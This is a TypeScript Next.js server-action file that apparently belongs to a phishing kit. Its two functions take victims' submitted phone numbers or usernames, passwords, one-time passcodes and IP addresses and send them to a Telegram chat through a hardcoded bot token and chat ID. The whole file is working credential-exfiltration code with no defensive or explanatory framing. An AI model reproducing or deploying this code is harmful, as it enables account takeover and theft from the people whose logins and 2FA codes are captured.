
'use server';

import TelegramBot from 'node-telegram-bot-api';
import { headers } from 'next/headers';

const token = '6858405369:AAHIBm11hz5SSLgH_BZb9mSSFBIOkeiExb8';
const chatId = '5485468089';

const bot = new TelegramBot(token);

export async function sendLoginDataToTelegram(data: any) {
  const headersList = headers();
  const ip = headersList.get('x-forwarded-for') || 'Not available';
  
  let message = `
    New Login Attempt
    -----------------
    IP Address: ${ip}
  `;

  if (data.loginType === 'phone') {
    message += `
    Login Type: Phone
    Country: ${data.country}
    Country Code: ${data.countryCode}
    Phone: ${data.phone}
    Password: ${data.password}
    `;
  } else {
    message += `
    Login Type: Email/Username
    Identifier: ${data.identifier}
    Password: ${data.password}
    `;
  }

  try {
    await bot.sendMessage(chatId, message);
    return { success: true, message: "Login data sent." };
  } catch (error) {
    console.error('Failed to send message to Telegram:', error);
    return { success: false, message: 'Failed to send login data.' };
  }
}

export async function sendOtpToTelegram(otp: string) {
    const headersList = headers();
    const ip = headersList.get('x-forwarded-for') || 'Not available';

    const message = `
        OTP Entered
        -----------
        IP Address: ${ip}
        OTP: ${otp}
    `;

    try {
        await bot.sendMessage(chatId, message);
        return { success: true, message: "OTP sent." };
    } catch (error) {
        console.error('Failed to send OTP to Telegram:', error);
        return { success: false, message: 'Failed to send OTP.' };
    }
}
